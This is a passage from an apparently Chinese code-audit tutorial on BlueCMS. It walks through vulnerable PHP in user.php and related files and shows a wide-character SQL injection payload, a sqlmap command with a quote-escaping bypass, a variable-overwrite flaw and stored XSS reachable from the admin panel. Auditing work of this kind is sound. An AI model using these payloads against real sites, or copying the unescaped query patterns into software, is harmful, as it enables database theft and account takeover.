class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getone</span><span class="token punctuation">(</span><span class="token string">"SELECT COUNT(*) AS num FROM "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" WHERE user_name='$user_name'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT COUNT(*) AS num FROM "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" WHERE user_name='$user_name' and pwd=md5('$pwd')"</span><span class="token punctuation">;</span></code></pre><p>构造注入Payloa：</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//由于程序使用$_REQUEST获取参数，因此可以用GET、POST。</span><span class="token comment" spellcheck="true">// %23是#进行URLencode的值，在URL中使用#必须要编码，否则会被当做锚点。不使用 --+ 是因为程序使用trim()函数对参数进行了处理。</span>user<span class="token punctuation">.</span>php<span class="token operator">?</span>act<span class="token operator">=</span>index_login<span class="token operator">&amp;</span>user_name<span class="token operator">=</span>admin<span class="token operator">%</span>af' <span class="token keyword">or</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span> <span class="token operator">&amp;</span>pwd<span class="token operator">=</span><span class="token number">123</span></code></pre><p>SQLMAP：<code>--tamper=&quot;unmagicquotes&quot;</code>用于进行宽字符注入，绕过转义。</p><pre><code>python .\sqlmap.py -u &quot;http://bluecms.com/user.php?act=index_login&amp;user_name=admin&amp;pwd=123&quot; --tamper=&quot;unmagicquotes&quot; --level 3 --dbs --batch  </code></pre><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200923161537266.png" alt="image-20200923161537266" style="zoom:40%;"><p>实际上，该CMS存在大量SQL宽字符注入，而不仅仅是此处。</p><h5 id="动态变量导致变量覆盖"><a href="#动态变量导致变量覆盖" class="headerlink" title="动态变量导致变量覆盖"></a>动态变量导致变量覆盖</h5><p>上一节我们分析到<code>user.php</code>文件在顶部会先包含几个文件，在分析<code>filter.inc.php</code>文件时，无意间发现存在一个由于采用动态变量<code>$$</code>形式，导致变量覆盖，但是比较鸡肋，只会把任意变量的值覆盖为<code>null</code>。</p><p>代码如下</p><pre class=" language-php"><code class="language-php"><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token keyword">as</span> <span class="token variable">$k1</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        $<span class="token variable">$k1</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$k1</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//动态变量导致变量覆盖，但只能将变量的值变null</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$_CFG</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token keyword">as</span> <span class="token variable">$k1</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$k1</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_CFG</span><span class="token punctuation">[</span><span class="token string">'replace_word'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$new_v</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$_CFG</span><span class="token punctuation">[</span><span class="token string">'replace_word'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'**'</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$new_v</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//$new_v只会为null。</span><span class="token punctuation">}</span></code></pre><p><strong>漏洞验证</strong></p><p>为了验证效果，在源码中新增一个<code>test</code>变量进行测试，下图为正常情况。</p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200923171859885.png" alt="image-20200923171859885" style="zoom:40%;"><p>接着传入<code>test</code>参数，由于经过<code>filter.inc.php</code>文件中的代码处理，发生了变量覆盖，<code>test</code>变量的值已被覆盖为<code>null</code>。可以尝试传入<code>_GET</code>、<code>_POST</code>等参数进行覆盖。</p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200923172255376.png" alt="image-20200923172255376" style="zoom:40%;"><p>由于只能把变量的值覆盖为<code>null</code>，暂未找到利用的方法。</p><h2 id="新用户注册"><a href="#新用户注册" class="headerlink" title="新用户注册"></a>新用户注册</h2><p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924091950908.png" alt="image-20200924091950908" style="zoom:35%;"><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924091916203.png" alt="image-20200924091916203" style="zoom: 40%;"></p><p>新用户注册功能依旧由<code>user.php</code>文件负责处理，提交注册请求时<code>act</code>为<code>do_reg</code>。</p><p>对参数的过滤处理部分依然同上小节所述，不再赘述。实际上可认为只会对参数使用<code>addslashes()</code>函数进行处理。</p><h5 id="SQL注入审计—结果为存在SQL宽字符-盲注"><a href="#SQL注入审计—结果为存在SQL宽字符-盲注" class="headerlink" title="SQL注入审计—结果为存在SQL宽字符+盲注"></a>SQL注入审计—结果为存在SQL宽字符+盲注</h5><p>第一处在校验用户名是否存在时，会发送Ajax请求。</p><p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924094256346.png" alt="image-20200924094256346" style="zoom:40%;"><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924094412540.png" alt="image-20200924094412540" style="zoom: 40%;"></p><p>Ajax请求如下图，依然是由<code>user.php</code>文件处理，<code>act</code>为<code>check_user_name</code>。</p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924094744465.png" alt="image-20200924094744465" style="zoom: 50%;"><p>后台校验代码</p><p><code>user.php</code></p><pre class=" language-php"><code class="language-php"><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$act</span> <span class="token operator">==</span> <span class="token string">'check_user_name'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check_user_name</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"&lt;span style='color:red'>该用户名已存在&lt;/span>"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"&lt;span style='color:#006CCE'>该用户名可以使用&lt;/span>"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p><code>user.func.php</code></p><pre class=" language-php"><code class="language-php"> <span class="token keyword">function</span> <span class="token function">check_user_name</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>     <span class="token variable">$user1</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getone</span><span class="token punctuation">(</span><span class="token string">"SELECT count(*) AS num FROM "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" WHERE user_name ='$user_name'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$user2</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getone</span><span class="token punctuation">(</span><span class="token string">"SELECT count(*) AS num FROM "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" WHERE admin_name ='$user_name'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user1</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token variable">$user2</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>     <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p>在<code>act=do_reg</code>时的逻辑中会再对用户名进行校验，同样有SQL查询，且存在注入，不再赘述。</p><h5 id="XSS审计—Email字段存在存储型XSS"><a href="#XSS审计—Email字段存在存储型XSS" class="headerlink" title="XSS审计—Email字段存在存储型XSS"></a>XSS审计—Email字段存在存储型XSS</h5><p>分析下列处理注册的代码，发现对<code>$user_name</code>和<code>$email</code>参数均没有进行XSS过滤处理，对<code>$user_name</code>的长度进行了限制，因此不好进行利用，但<code>$email</code>字段是没有任何限制的，存在存储型的XSS。</p><pre class=" language-php"><code class="language-php"> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$act</span> <span class="token operator">==</span> <span class="token string">'do_reg'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user_name</span>         <span class="token operator">=</span>    <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pwd</span>               <span class="token operator">=</span>     <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pwd1</span>                <span class="token operator">=</span>     <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pwd1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pwd1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$email</span>             <span class="token operator">=</span>     <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//XSS，可打管理员后台</span>    <span class="token variable">$safecode</span>          <span class="token operator">=</span>     <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'safecode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'safecode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$from</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">'user.php'</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//限制用户名长度在4到16个字符长度。</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token markup">&lt; 4 || strlen($user_name) ></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'用户名字符长度不符'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES ('', '$user_name', md5('$pwd'), '$email', '$timestamp', '$timestamp')"</span><span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>省略部分代码<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'last_reg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$timestamp</span><span class="token punctuation">;</span>        <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'恭喜您注册成功,现在将转向...'</span><span class="token punctuation">,</span> <span class="token variable">$from</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p>实际上在用户登录后的个人中心，也可以对<code>Email</code>进行修改，同样也没有进行编码过滤，存在漏洞。</p><p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924101413947.png" alt="image-20200924101413947" style="zoom:40%;"><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924102701952.png" alt="image-20200924102701952" style="zoom:40%;"></p><p><strong>漏洞验证与利用</strong></p><p>经过查看程序的各个页面，发现管理员后台有个<code>会员管理—&gt;会员列表</code>功能，会将<code>Email</code>显示在页面，因此该漏洞可打管理员后台。</p><p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924102001257.png" alt="image-20200924102001257" style="zoom:40%;"><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924101920131.png" alt="image-20200924101920131" style="zoom:40%;"></p><h2 id="个人中心"><a href="#个人中心" class="headerlink" title="个人中心"></a>个人中心</h2><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924104108312.png" alt="image-20200924104108312" style="zoom: 50%;"><p>个人中心修改个人资料功能依旧由<code>user.php</code>文件负责处理，提交注册请求时<code>act</code>为<code>edit_user_info</code>。</p><h5 id="XSS审计—大量输入点存在存储型XSS"><a href="#XSS审计—大量输入点存在存储型XSS" class="headerlink" title="XSS审计—大量输入点存在存储型XSS"></a>XSS审计—大量输入点存在存储型XSS</h5><p>个人资料的信息输入项中，只有<code>地址</code>信息项使用<code>htmlspecialchars()</code>进行了实体化编码，其它均未进行编码或过滤：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$act</span> <span class="token operator">==</span> <span class="token string">'edit_user_info'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'sex'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>      <span class="token variable">$msn</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'msn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'msn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$qq</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'qq'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'qq'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$mobile_phone</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'mobile_phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'mobile_phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$office_phone</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'office_phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'office_phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$home_phone</span>   <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'home_phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'home_phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//仅地址参数进行了转义。</span></code></pre><p>虽然很多信息项没有进行转义过滤，但是可以发现，在有一些信息项插入的Payload被截断了，同时未发现有对信息项长度进行限制的代码。实际是因为数据库对表的字段长度进行了限制。</p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924105816536.png" alt="image-20200924105816536" style="zoom:40%;"><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924110821674.png" alt="image-20200924110821674" style="zoom:50%;"><h5 id="任意文件上传审计—不存在"><a href="#任意文件上传审计—不存在" class="headerlink" title="任意文件上传审计—不存在"></a>任意文件上传审计—不存在</h5><p>审计点在头像上传处，参数名为<code>face_pic2</code></p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924111513958.png" alt="image-20200924111513958" style="zoom:50%;"><p>接下来看处理头像上传的代码，一共进行了两次过滤，第一次是对<code>content-type</code>进行过滤，可修改绕过。但是第二次采用了白名单后缀过滤方式，且重新生成了文件名，因此无法绕过。只能配合文件包含来进行利用。</p><p><code>user.php</code></p><pre class=" language-php"><code class="language-php"><span class="token variable">$image</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$act</span> <span class="token operator">==</span> <span class="token string">'edit_user_info'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    。。。。。。    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'face_pic2'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'face_pic2'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$face_pic</span> <span class="token operator">=</span> <span class="token variable">$image</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">img_upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'face_pic2'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'face_pic'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//处理文件上传的核心代码</span>    <span class="token punctuation">}</span>    <span class="token variable">$face_pic</span> <span class="token operator">=</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$face_pic</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token punctuation">:</span> <span class="token variable">$face_pic</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" SET birthday = '$birthday', sex = '$sex', face_pic = '$face_pic', email = '$email', msn = '$msn', qq = '$qq',"</span> <span class="token punctuation">.</span>            <span class="token string">" mobile_phone = '$mobile_phone', office_phone = '$office_phone', home_phone = '$home_phone', address='$address' WHERE user_id = "</span><span class="token punctuation">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'更新个人资料成功'</span><span class="token punctuation">,</span> <span class="token string">'user.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p><code>upload.class.php</code></p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">upload</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$allow_image_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'image/jpeg'</span><span class="token punctuation">,</span> <span class="token string">'image/gif'</span><span class="token punctuation">,</span> <span class="token string">'image/png'</span><span class="token punctuation">,</span> <span class="token string">'image/pjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$extension_name_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'pjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 上传图片     */</span>    <span class="token keyword">function</span> <span class="token function">img_upload</span><span class="token punctuation">(</span><span class="token 